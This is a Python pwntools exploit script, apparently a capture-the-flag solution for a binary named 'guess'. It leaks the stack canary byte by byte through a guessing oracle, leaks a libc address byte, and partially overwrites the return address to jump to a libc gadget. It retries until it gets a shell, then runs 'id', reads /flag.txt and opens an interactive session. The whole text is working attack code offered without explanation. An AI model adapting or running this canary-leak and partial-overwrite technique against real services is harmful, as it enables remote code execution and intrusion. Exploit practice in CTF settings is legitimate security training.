#!/usr/bin/python3
from pwn import *


e = ELF("./src/guess", checksec=False)

def do_pwn():
    if args.REMOTE:
        target = 0xe6c7e + 0x10000
        # d371da546786965fe0ee40147ffef716
        # 2.31-0ubuntu9.2
        l = ELF("./libc.so.6", checksec=False)
        with context.local(log_level = 'error'):
            r = remote(args.HOST, int(args.PORT))
        lsmr = 243
    else:
        target = 0xcbd1a
        l = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        with context.local(log_level = 'error'):
            r = process(e.path)
        lsmr = 234


    def check_value(index, value):
        r.recvuntil(b"? ", timeout=1)
        r.sendline(str(index).encode())
        r.recvuntil(b"guess: ", timeout=1)
        r.sendline(str(value).encode())
        res = r.recvline().decode()
        if "too low" in res:
            return -1
        elif "high" in res:
            return 1
        else:
            return True


    def find_value(index):
        possible = list(range(256))
        while True:
            pos = len(possible)//2
            test = check_value(index, possible[pos])
            if test is True:
                return possible[pos]
            elif test == -1:
                possible = possible[pos:]
            elif test == 1:
                possible = possible[:pos]


    canary = b"\x00"
    while len(canary) < 8:
        canary = canary + chr(find_value(0x20 + len(canary))).encode('latin1')

    """
    canary = b""
    while len(canary) < 7:
        canary = canary + chr(find_value(0x20 + 8 + 8 + len(canary))).encode('latin1')
    canary += b"\x00"
    print(hex(u64(canary)  - (l.sym['__libc_start_main'] + lsmr)))
    log.success(f"LIBC: {hexdump(canary)}")
    """

    libc_byte = find_value(0x20 + 8 + 8 + 2)

    offset = target - (l.sym['__libc_start_main'] + lsmr)
    byte_offset = (offset >> 16) & 0xff
    if (libc_byte + byte_offset) > 0xff:
        with context.local(log_level = 'error'):
            r.close()
        log.warn("Overflow")
        del r
        return False

    buffer = b"A" * 0x18
    buffer += canary
    buffer += b"B" * 8
    buffer += chr(target & 0xff).encode('latin1')  # LSB - known
    buffer += chr(((target >> 8) & 0xff) | 0x80).encode('latin1')  # 2nd LSB - low nibble known, guess upper half
    buffer += chr(libc_byte + byte_offset).encode('latin1')  # 3rd LSB - offset from leaked byte known
    print(r.recv(timeout=1))
    r.send(buffer)
    r.sendline(b'id')
    try:
        res = r.recv(timeout=1)
        r.sendline(b"cat /flag.txt")
        print(r.recvline().decode())
        r.interactive()
        return True
    except Exception as e:
        with context.local(log_level = 'error'):
            r.close()
        del r
        return False

while not do_pwn():
    log.warn("Attempt failed, retrying")
